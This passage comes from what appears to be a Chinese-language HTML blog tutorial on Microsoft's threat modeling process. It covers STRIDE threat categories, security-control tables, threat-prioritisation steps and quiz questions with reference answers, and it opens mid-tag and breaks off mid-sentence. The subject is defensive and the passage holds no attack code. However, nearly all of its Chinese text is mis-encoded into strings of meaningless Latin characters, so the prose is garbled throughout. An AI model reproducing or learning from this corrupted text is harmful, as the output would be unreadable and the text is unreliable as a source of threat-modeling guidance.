href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>ç¦»çº¿å®‰è£…ç‰ˆï¼Œ<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> ï¼ˆ2016ï¼‰</li><li>æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ <u>microsoft threat modeling tool offline installer</u> å°±å¥½äº†</li></ul></li><li>Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº†</li></ul><h4 id="çŸ¥è¯†æ£€æŸ¥"><a href="#çŸ¥è¯†æ£€æŸ¥" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>è®¾è®¡é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä½ çŸ¥é“ç³»ç»Ÿçš„å·¥ä½œæ–¹å¼ã€‚ è¿˜å¯ä»¥ç¡®å®šä»äº‘æä¾›å•†å’Œé›†æˆæœåŠ¡ç»§æ‰¿çš„å®‰å…¨è¦æ±‚ã€ä¿è¯æˆ–å·®è·</p>            </div><div class='checkbox'><input type="radio" />            <p>B. æ­¤æ—¶ä¸å¿…ç ”ç©¶æ‰€æœ‰å®‰å…¨ä¿è¯ã€å‡è®¾å’Œå·®è·ï¼Œå”¯ä¸€çš„ä»»åŠ¡å°±æ˜¯åˆ›å»ºæ•°æ®æµå…³ç³»å›¾</p>            </div><div class='checkbox'><input type="radio" />            <p>C. åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œç¡®å®šå¹¶è§£å†³ä¸ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰å®‰å…¨é—®é¢˜</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œè¯·å°½å¯èƒ½æ”¶é›†æœ‰å…³ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ã€‚B. åœ¨è®¾è®¡é˜¶æ®µè¾ƒæ—©æ”¶é›†å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ï¼Œä½ å°±å¯ä»¥åšå‡ºæ˜æ™ºçš„å†³ç­–ä»¥æ›´å¥½åœ°ä¿æŠ¤ç³»ç»Ÿã€‚C. åœ¨è®¾è®¡é˜¶æ®µä¹‹åçš„ä¸­æ–­å’Œä¿®å¤é˜¶æ®µæ‰§è¡Œåˆ›å»ºå…³ç³»å›¾çš„ä»»åŠ¡ã€‚</psw></p><h3 id="æ­¥éª¤2-ä¸­æ–­"><a href="#æ­¥éª¤2-ä¸­æ–­" class="headerlink" title="æ­¥éª¤2 - ä¸­æ–­"></a>æ­¥éª¤2 - ä¸­æ–­</h3><p>åœ¨ä¸­æ–­é˜¶æ®µï¼Œ<strong>éœ€ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾æŸ¥æ‰¾é’ˆå¯¹ç³»ç»Ÿçš„æ½œåœ¨å¨èƒ</strong>ã€‚ æ­¤è¿‡ç¨‹ä½¿ç”¨å¨èƒå»ºæ¨¡æ¡†æ¶ï¼Œä»¥å¸®åŠ©ä½ æŸ¥æ‰¾æœ€å¸¸è§çš„å¨èƒå’Œé˜²èŒƒå¨èƒçš„æ–¹æ³•ã€‚</p><h4 id="ç›®æ ‡-1"><a href="#ç›®æ ‡-1" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h4><ul><li>é€‰æ‹©ä»¥ â€œä¿æŠ¤ç³»ç»Ÿâ€ æˆ– â€œäº†è§£æ”»å‡»è€…â€ ä¸ºæ ¸å¿ƒçš„æ–¹æ³• ï¼ˆå¯å‚è€ƒæ¨¡å—4äº†è§£è¿™ä¸¤ç§æ–¹æ³•ï¼‰</li><li>ä½¿ç”¨ <a href="https://zh.wikipedia.org/wiki/STRIDE">STRIDE</a> æ¡†æ¶è¯†åˆ«å¸¸è§å¨èƒï¼ˆSTRIDEå¨èƒæ¨¡å‹å‡ ä¹å¯ä»¥æ¶µç›–ç›®å‰ç»å¤§éƒ¨åˆ†å®‰å…¨é—®é¢˜ï¼‰ï¼Œå³<ul><li>æ¬ºéª—ï¼ˆ<strong>S</strong>poofingï¼‰</li><li>ç¯¡æ”¹ï¼ˆ<strong>T</strong>amperingï¼‰</li><li>å¦è®¤ï¼ˆ<strong>R</strong>epudiationï¼‰</li><li>èµ„è®¯æ³„éœ²ï¼ˆ<strong>I</strong>nformation disclosureï¼‰ï¼Œå¯èƒ½æ˜¯éšç§æ³„éœ²æˆ–æ˜¯èµ„æ–™å¤–æ³„</li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">é˜»æ–­æœåŠ¡æ”»å‡»</a>ï¼ˆ<strong>D</strong>enial of serviceï¼‰</li><li><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87">ç‰¹æƒæå‡</a>ï¼ˆ<strong>E</strong>levation of privilege</li></ul></li></ul><div class="note warning"><p>å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±ä¸ä¼šå‘ç°ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æœªæ¥å‡ºç°è¿è§„ç°è±¡ã€‚</p></div><h4 id="ç¡®å®šæ–¹æ³•ä¾§é‡ç‚¹"><a href="#ç¡®å®šæ–¹æ³•ä¾§é‡ç‚¹" class="headerlink" title="ç¡®å®šæ–¹æ³•ä¾§é‡ç‚¹"></a>ç¡®å®šæ–¹æ³•ä¾§é‡ç‚¹</h4><p>é¦–å…ˆï¼Œé€‰æ‹©æ˜¯è¦æ‰¾åˆ°ä¿æŠ¤ç³»ç»Ÿçš„æ–¹æ³•ï¼Œè¿˜æ˜¯æƒ³è¦å°½å¯èƒ½åœ°äº†è§£æ”»å‡»è€…åŠå…¶åŠ¨æœºã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><table><thead><tr><th align="left">ä¾§é‡ç‚¹</th><th align="left">å¯ä»¥æŸ¥æ‰¾çš„å†…å®¹ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">ç³»ç»Ÿ</td><td align="left">å‘ç°ç”¨æˆ·ä¸ç³»ç»Ÿä¹‹é—´çš„æœªåŠ å¯†è¿æ¥å­˜åœ¨é—®é¢˜ã€‚</td></tr><tr><td align="left">æ”»å‡»è€…</td><td align="left">è¿›ä¸€æ­¥äº†è§£æ–¹æ³•ã€åŠ¨æœºå’Œå¼ºåŒ–ç³»ç»Ÿå…¥å£ç‚¹çš„æ–¹æ³•ã€‚</td></tr><tr><td align="left">èµ„äº§</td><td align="left">åŸºäºåˆ†ç±»æ•°æ®å¤„ç†ç­‰åŠŸèƒ½ç¡®å®šå…³é”®èµ„äº§ï¼Œä¸»è¦ä¸“æ³¨äºä¿æŠ¤è¿™äº›èµ„äº§ã€‚</td></tr></tbody></table><div class="note info"><p>Microsoft äº§å“å·¥ç¨‹å¸ˆä¸»è¦è‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿã€‚ æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸¤è€…å…¼é¡¾ã€‚</p></div><h4 id="é€‰æ‹©å¨èƒæ¡†æ¶"><a href="#é€‰æ‹©å¨èƒæ¡†æ¶" class="headerlink" title="é€‰æ‹©å¨èƒæ¡†æ¶"></a>é€‰æ‹©å¨èƒæ¡†æ¶</h4><p>æ¥ä¸‹æ¥ï¼Œé€‰æ‹©ä¸€ä¸ªæ¡†æ¶ï¼Œå¸®åŠ©ç”Ÿæˆç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚ Microsoft é€šå¸¸ä½¿ç”¨ <a href="https://zh.wikipedia.org/wiki/STRID">STRIDE</a>ï¼ˆå…­ä¸ªä¸»è¦å¨èƒç±»åˆ«çš„é¦–å­—æ¯ç¼©å†™ï¼‰æä¾›å¹¿æ³›ä½†ä¸å®Œæ•´çš„å¨èƒåˆ—è¡¨ã€‚</p><p>æ­¤æ¡†æ¶å¯å¸®åŠ©ä½ æå‡ºæœ‰å…³ç³»ç»Ÿçš„å‡ ä¸ªé‡è¦é—®é¢˜ï¼š</p><table><thead><tr><th align="left">å¨èƒ</th><th align="left">å®šä¹‰</th><th align="left">é—®é¢˜</th><th align="left">å¨èƒç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æ¬ºéª—</td><td align="left">æ”»å‡»è€…å†’å……æŸäººæˆ–æŸç‰©</td><td align="left">é€šä¿¡çš„åŒæ–¹æ˜¯å¦éƒ½é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Ÿ</td><td align="left">é€šè¿‡çœ‹ä¼¼åˆæ³•çš„å¸æˆ·å‘ç”¨æˆ·å‘é€ä¸€å°å¸¦æœ‰æ¶æ„é“¾æ¥å’Œé™„ä»¶çš„ç”µå­é‚®ä»¶ï¼Œä»¥æ•è·ç”¨æˆ·çš„å‡­æ®ã€æ•°æ®å’Œè®¾å¤‡è®¿é—®æƒé™ã€‚</td></tr><tr><td align="left">ç¯¡æ”¹</td><td align="left">æ”»å‡»è€…åœ¨æœªç»æˆæƒçš„æƒ…å†µä¸‹æ›´æ”¹æ•°æ®</td><td align="left">å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ</td><td align="left">é€šè¿‡å¼± API è°ƒç”¨å¤„ç†ä¿®æ”¹å†…å­˜ï¼Œå¯¼è‡´å´©æºƒå’Œæ³„æ¼æ•æ„Ÿé”™è¯¯æ¶ˆæ¯ã€‚</td></tr><tr><td align="left">å¦è®¤æ€§</td><td align="left">æ”»å‡»è€…å£°ç§°å°šæœªæ‰§è¡Œä»»ä½•æ“ä½œ</td><td align="left">æ¯ä¸ªæ“ä½œæ˜¯å¦å¯ä»¥ç»‘å®šåˆ°æ ‡è¯†ï¼Ÿ</td><td align="left">å£°ç§°æ²¡æœ‰åˆ é™¤æ•°æ®åº“è®°å½•ã€‚</td></tr><tr><td align="left">ä¿¡æ¯æ³„éœ²</td><td align="left">æ”»å‡»è€…çœ‹åˆ°äº†ä¸åº”çœ‹åˆ°çš„æ•°æ®</td><td align="left">å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•çœ‹åˆ°ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ</td><td align="left">è®¿é—®å®‰å…¨æ§åˆ¶è¾ƒå¼±çš„æœªæˆæƒæ–‡æ¡£å’Œæ–‡ä»¶å¤¹ã€‚</td></tr><tr><td align="left">æ‹’ç»æœåŠ¡</td><td align="left">æ”»å‡»è€…ä½¿ä½ çš„ç³»ç»Ÿå´©æºƒ</td><td align="left">ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨èµ„æºå—é™çš„åŒºåŸŸï¼Ÿ</td><td align="left">å‘ç½‘ç»œå‘é€å¤§é‡è¯·æ±‚ã€‚</td></tr><tr><td align="left">æƒé™æå‡</td><td align="left">æ”»å‡»è€…æœªç»æˆæƒè€Œå¯è®¿é—®æ•°æ®</td><td align="left">å¦‚ä½•å¾—çŸ¥æŸäººå¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ</td><td align="left">åˆ©ç”¨è¾“å…¥å¤„ç†é€»è¾‘æˆ–å†…å­˜ä¸­çš„å¼±ç‚¹æ¥æå–æ•°æ®ã€‚</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-1"><a href="#çŸ¥è¯†æ£€æŸ¥-1" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä¸­æ–­é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. é€šè¿‡ç›¸å…³æ¡†æ¶é€‰æ‹©é‡ç‚¹é¢†åŸŸï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. é€šè¿‡ç›¸å…³æ¡†æ¶é€‰æ‹©é‡ç‚¹é¢†åŸŸï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«å¯ä»¥åº”ç”¨åˆ°ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. å®‰å…¨å›¢é˜Ÿå¼€ä¼šè®¨è®ºï¼Œé€‰æ‹©é‡ç‚¹é¢†åŸŸå’Œç›¸å…³æ¡†æ¶ï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. åœ¨ä½¿ç”¨ STRIDE æŸ¥æ‰¾æ½œåœ¨å¨èƒæ—¶ï¼Œè¯·å…³æ³¨ç³»ç»Ÿæˆ–æ”»å‡»è€…ã€‚B. æ­¤ä»»åŠ¡å±äºé˜¶æ®µ 3 - ä¿®å¤é˜¶æ®µã€‚C. åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥é€‰æ‹©ä¸å®‰å…¨å›¢é˜Ÿå¼€ä¼šè®¨è®ºï¼Œä½†ä¸å¼ºåˆ¶è¦æ±‚è¿™ä¹ˆåšï¼ˆé™¤éç»„ç»‡æœ‰ç›¸å…³è¦æ±‚ï¼‰ã€‚</psw></p><h3 id="æ­¥éª¤3-ä¿®å¤"><a href="#æ­¥éª¤3-ä¿®å¤" class="headerlink" title="æ­¥éª¤3 - ä¿®å¤"></a>æ­¥éª¤3 - ä¿®å¤</h3><p>åœ¨ä¿®å¤é˜¶æ®µï¼Œéœ€è¦å†³å®šå¦‚ä½•å¤„ç†æ‰€æœ‰å¨èƒã€‚ æ¯ä¸ª STRIDE å¨èƒéƒ½å¯¹åº”åˆ°ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶ï¼Œè¿™äº›æ§åˆ¶æªæ–½æä¾›ä¸åŒçš„åŠŸèƒ½å’Œç±»å‹ä¾›ä½ é€‰æ‹©ã€‚</p><h4 id="ç›®æ ‡-2"><a href="#ç›®æ ‡-2" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h4><ul><li>æ ¹æ®<strong>ä¼˜å…ˆçº§æ¡†æ¶æˆ–å®‰å…¨ bug æ è¡¡é‡æ¯ä¸ªå¨èƒçš„ä¼˜å…ˆçº§</strong></li><li>åœ¨ bug ç®¡ç†æœåŠ¡ä¸­å°†æ¯ä¸ªå¨èƒä½œä¸ºä»»åŠ¡æˆ–å·¥ä½œé¡¹è¿›è¡Œè·Ÿè¸ª</li><li>ç”Ÿæˆå¯¹åº”äº STRIDE å¨èƒçš„å®‰å…¨æ§åˆ¶å»ºè®®</li><li>é€‰æ‹©ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶ç±»å‹å’ŒåŠŸèƒ½æ¥åº”å¯¹æ¯ä¸ªå¨èƒ</li><li>è§£å†³ä»»åŠ¡</li></ul><div class="note warning"><p>å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±æ‰¾ä¸åˆ°å®‰å…¨æ§åˆ¶æ¥å¸®åŠ©é™ä½é£é™©æˆ–æ­£ç¡®è·Ÿè¸ªæ¯ä¸ªå¨èƒã€‚</p></div><h4 id="è®¾ç½®å¨èƒè·Ÿå¢å·¥ä½œæµ"><a href="#è®¾ç½®å¨èƒè·Ÿå¢å·¥ä½œæµ" class="headerlink" title="è®¾ç½®å¨èƒè·Ÿå¢å·¥ä½œæµ"></a>è®¾ç½®å¨èƒè·Ÿå¢å·¥ä½œæµ</h4><h5 id="ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§"><a href="#ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§" class="headerlink" title="ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§"></a>ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§</h5><p>é¦–å…ˆï¼Œæ ¹æ®ä¼˜å…ˆçº§æ¡†æ¶æˆ–å®‰å…¨ bug æ æ¥è¡¡é‡æ¯ä¸ªå¨èƒã€‚ æ­¤è¿‡ç¨‹å¯å¸®åŠ©ä½ è®¡åˆ’èµ„æºæ¥è§£å†³å¯¹ç»„ç»‡è€Œè¨€æ›´é‡è¦çš„é—®é¢˜ã€‚</p><p>æ­¤è¿‡ç¨‹ä½¿ç”¨ä¸‰ä¸ªå…³é”®å˜é‡ï¼š</p><table><thead><tr><th align="left">å˜é‡</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>å½±å“</strong></td><td align="left">ä½¿ç”¨ STRIDE ç±»åˆ«åˆ†é…å½±å“ã€‚</td></tr><tr><td align="left"><strong>ä¸¥é‡æ€§</strong></td><td align="left">ä½¿ç”¨å†…éƒ¨ bug æ æˆ–ä¼˜å…ˆçº§æ¡†æ¶æ¥åˆ†é…æœ€åæƒ…å†µä¸‹çš„ä¸¥é‡æ€§ã€‚</td></tr><tr><td align="left"><strong>é£é™©</strong></td><td align="left">å¯¹å®‰å…¨æ§åˆ¶æœ‰æ•ˆæ€§å’Œå®ç°æˆæœ¬è¿›è¡Œè®¡ç®—ã€‚</td></tr></tbody></table><div class="note info"><p>Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨å†…éƒ¨å®‰å…¨ bug æ ï¼Œä¸ºå¨èƒåˆ†é…â€œä¸¥é‡â€ã€â€œé‡è¦â€ã€â€œä¸­ç­‰â€ã€â€œä½â€æˆ–â€œä¿¡æ¯â€ä¸¥é‡æ€§ç­‰çº§ã€‚ è¯·å’¨è¯¢å®‰å…¨å›¢é˜Ÿï¼Œç¡®è®¤å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ã€‚</p></div><h5 id="åˆ›å»ºä»»åŠ¡"><a href="#åˆ›å»ºä»»åŠ¡" class="headerlink" title="åˆ›å»ºä»»åŠ¡"></a>åˆ›å»ºä»»åŠ¡</h5><p>æ¥ä¸‹æ¥ï¼Œåœ¨ Azure DevOps Services ç­‰ <strong>bug ç®¡ç†è§£å†³æ–¹æ¡ˆ</strong>ä¸­æ·»åŠ æ¯ä¸ªå¨èƒã€‚ éƒ¨åˆ†ä¼˜ç‚¹åŒ…æ‹¬ï¼š</p><ul><li>è¿›ä¸€æ­¥ç¡®å®šé—®é¢˜è´£ä»»äºº</li><li>æœ‰æ•ˆè·Ÿè¸ªå†å²è®°å½•</li><li>è®©ä½ èƒ½å¤Ÿä½¿ç”¨æ ‡å‡†åŒ–æ¨¡æ¿æ¥è¿›è¡Œä¼˜å…ˆçº§å’Œè§£å†³æ–¹æ¡ˆæ¼”ç»ƒ</li></ul><h4 id="è¯„ä¼°å¨èƒæœ‰æ•ˆæ€§å’Œæˆæœ¬"><a href="#è¯„ä¼°å¨èƒæœ‰æ•ˆæ€§å’Œæˆæœ¬" class="headerlink" title="è¯„ä¼°å¨èƒæœ‰æ•ˆæ€§å’Œæˆæœ¬"></a>è¯„ä¼°å¨èƒæœ‰æ•ˆæ€§å’Œæˆæœ¬</h4><p>æŸ¥çœ‹å¯¹åº”äº STRIDE å¨èƒçš„æ¯é¡¹å®‰å…¨æ§åˆ¶å»ºè®®ã€‚ è®°ä¸‹æœ€æœ‰æ•ˆå’Œæˆæœ¬æœ€ä½çš„å»ºè®®ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="left">å¨èƒ</th><th align="left">å®‰å…¨æ§åˆ¶</th><th align="left">å®‰å…¨æ§åˆ¶ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong>æ¬ºéª—</strong></td><td align="left">èº«ä»½éªŒè¯</td><td align="left">å‘é€å’Œæ¥æ”¶ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œç­¾åçš„æ¶ˆæ¯ï¼Œä»¥éªŒè¯æ¥æºå¹¶ç¡®ä¿æ¶ˆæ¯å®Œæ•´æ€§ã€‚</td></tr><tr><td align="left"><strong>ç¯¡æ”¹</strong></td><td align="left">å®Œæ•´æ€§</td><td align="left">éªŒè¯è¾“å…¥ä»¥é˜²æ­¢å¤„ç†æ¶æ„æœ‰æ•ˆè´Ÿè½½å’Œé”™è¯¯å¤„ç†æ„å¤–è¡Œä¸ºã€‚</td></tr><tr><td align="left"><strong>å¦è®¤æ€§</strong></td><td align="left">ä¸å¯å¦è®¤æ€§</td><td align="left">åˆ›å»ºå’Œä¿æŠ¤åŒ…å«ç”¨æˆ·æ“ä½œå’Œæ—¶é—´æˆ³çš„å®‰å…¨æ—¥å¿—ã€‚</td></tr><tr><td align="left"><strong>ä¿¡æ¯æ³„éœ²</strong></td><td align="left">ä¿å¯†æ€§</td><td align="left">åº”ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œä»¥ç¡®ä¿åˆé€‚çš„ç”¨æˆ·å¯ä»¥è®¿é—®é€‚å½“çš„æ•°æ®ã€‚</td></tr><tr><td align="left"><strong>æ‹’ç»æœåŠ¡</strong></td><td align="left">å¯ç”¨æ€§</td><td align="left">ä½¿ç”¨å¼¹æ€§èµ„æºç®¡ç†ä¸æ–­å¢åŠ æˆ–å‡å°‘çš„ä½¿ç”¨é‡ã€‚</td></tr><tr><td align="left"><strong>æƒé™æå‡</strong></td><td align="left">æˆæƒ</td><td align="left">ä½¿ç”¨æœ€å°‘çš„è®¿é—®é‡è¿è¡ŒæœåŠ¡ã€‚</td></tr></tbody></table><div class="note info"><p>å¯èƒ½æœ‰è¿™æ ·çš„å®‰å…¨æ§åˆ¶ï¼Œå¯ä»¥åŒæ—¶å‡è½»æˆ–å®Œå…¨æ¶ˆé™¤å¤šä¸ªå¨èƒã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ SSL/TLS åˆ›å»ºå®‰å…¨ä¼ è¾“é€šé“ï¼Œä»¥å¸®åŠ©é˜²æ­¢æ¶æ„æ•°æ®ä¿®æ”¹æˆ–æ³„éœ²ã€‚</p></div><h4 id="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½"><a href="#å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½" class="headerlink" title="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½"></a>å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½</h4><p>å®‰å…¨æ§åˆ¶å…·æœ‰ä¸åŒçš„ç±»å‹å’ŒåŠŸèƒ½ã€‚ ç»“åˆä½¿ç”¨æ—¶ï¼Œå®ƒä»¬æœ‰åŠ©äºä¿æŠ¤ç³»ç»Ÿçš„å®‰å…¨ï¼Œå¹¶åˆ›å»ºå¤šä¸ªå®‰å…¨ä¿æŠ¤å±‚ï¼Œä¹Ÿç§°ä¸ºæ·±å±‚é˜²å¾¡ã€‚</p><p>ä½ å¯ä»¥é€‰æ‹©ä¸€ç§æˆ–å¤šç§å®‰å…¨æ§åˆ¶ç±»å‹ï¼š</p><ul><li>ç‰©ç†ç±»å‹ï¼Œå¦‚æ‘„åƒå¤´</li><li>æŠ€æœ¯ç±»å‹ï¼Œå¦‚åŠ å¯†</li><li>ç®¡ç†ç±»å‹ï¼Œå¦‚ç­–ç•¥</li></ul><p>å®ƒä»¬å¯èƒ½æœ‰ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶åŠŸèƒ½ï¼š</p><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>é¢„é˜²</strong></td><td align="left">é™ä½å¨èƒçš„æ¦‚ç‡æˆ–å½±å“ï¼Œå¦‚é˜²ç«å¢™ã€‚</td></tr><tr><td align="left"><strong>æ£€æµ‹</strong></td><td align="left">è¯†åˆ«å‘ç”Ÿçš„æ”»å‡»ï¼Œå¦‚ç›‘è§†ã€‚</td></tr><tr><td align="left"><strong>çº æ­£</strong></td><td align="left">æ§åˆ¶ç³»ç»Ÿå¦‚ä½•å“åº”å…¶å—åˆ°çš„æ”»å‡»ï¼Œå¦‚ç³»ç»Ÿä¿®è¡¥ç¨‹åºã€‚</td></tr><tr><td align="left"><strong>æ¢å¤</strong></td><td align="left">ä»æ”»å‡»ä¸­æ¢å¤ç³»ç»Ÿï¼Œå¦‚å¤‡ä»½ã€‚</td></tr><tr><td align="left"><strong>é˜»ç¢</strong></td><td align="left">é˜»æ­¢æ”»å‡»è€…è®¿é—®ç³»ç»Ÿï¼Œå¦‚æœ€ä½æƒé™ã€‚</td></tr></tbody></table><h4 id="ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ å®‰å…¨æ§åˆ¶è¯¦ç»†ä¿¡æ¯"><a href="#ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ å®‰å…¨æ§åˆ¶è¯¦ç»†ä¿¡æ¯" class="headerlink" title="ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ å®‰å…¨æ§åˆ¶è¯¦ç»†ä¿¡æ¯"></a>ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ å®‰å…¨æ§åˆ¶è¯¦ç»†ä¿¡æ¯</h4><p>åœ¨ bug ç®¡ç†è§£å†³æ–¹æ¡ˆä¸­ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ è¯¦ç»†ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å…¶ä¸­ä¸€ä¸ªè§£å†³æ–¹æ¡ˆè§£å†³å„ä¸ªé—®é¢˜ã€‚ è¿™åœ¨ä¸åŒç»„ç»‡ä¹‹é—´å­˜åœ¨ç•¥å¾®å·®å¼‚ï¼š</p><table><thead><tr><th align="left">è§£å†³æ–¹æ¡ˆ</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>å‡è½»</strong></td><td align="left">å°†é€šè¿‡ Bug ä¿®å¤æˆ–é‡æ–°è®¾è®¡æ¥è§£å†³é—®é¢˜ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤å¨èƒå½±å“å’Œä¸¥é‡æ€§ã€‚</td></tr><tr><td align="left"><strong>è½¬ç§»</strong></td><td align="left">ç”±å…¶ä»–ç³»ç»Ÿæˆ–å›¢é˜Ÿå¤„ç†é—®é¢˜ã€‚</td></tr><tr><td align="left"><strong>é¿å…</strong></td><td align="left">å»é™¤ç³»ç»Ÿä¸­åŒ…å«é—®é¢˜çš„éƒ¨åˆ†ã€‚</td></tr><tr><td align="left"><strong>æ¥å—</strong></td><td align="left">æ²¡æœ‰è§£å†³æ–¹æ¡ˆï¼Œå°†æ¥å—é£é™©ã€‚ éœ€è¦ç»æˆæƒçš„é£é™©å†³ç­–è€…çš„æ‰¹å‡†ï¼Œå…¶ä¸­å†³ç­–è€…å¯èƒ½å–å†³äºå¨èƒçš„ä¸¥é‡æ€§ã€‚ ä¸¥é‡å¨èƒå¯èƒ½éœ€è¦é«˜çº§é¢†å¯¼çš„æ‰¹å‡†ï¼Œè€Œæ·±å±‚é˜²å¾¡é£é™©å¯èƒ½éœ€è¦é«˜çº§å·¥ç¨‹å¸ˆæ‰¹å‡†ã€‚ ä¸ä½ çš„å›¢é˜Ÿäº¤æµä»¥è·å¾—æˆ˜ç•¥æŒ‡å¯¼ã€‚</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-2"><a href="#çŸ¥è¯†æ£€æŸ¥-2" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä¿®å¤é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. åœ¨éƒ¨ç½²ç³»ç»Ÿä¹‹å‰éªŒè¯æ‰€æœ‰ä¿®è¡¥ç¨‹åºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. åœ¨è¿™ä¸€é˜¶æ®µï¼Œä½ å°†ç”Ÿæˆå¹¶éªŒè¯ä¸€ç³»åˆ—å®‰å…¨æ§åˆ¶ï¼Œå¹¶è®¾ç½®å…¶ä¼˜å…ˆçº§ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤é£é™©ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. æ­¤æ—¶ï¼Œé€‰æ‹©æ¡†æ¶ä»¥å¸®åŠ©ç”Ÿæˆæ½œåœ¨çš„å¨èƒã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== B ==</psw></p><p>è§£é‡Šï¼š<psw>A. å±äºæ­¥éª¤ 4 - éªŒè¯é˜¶æ®µã€‚B. psw 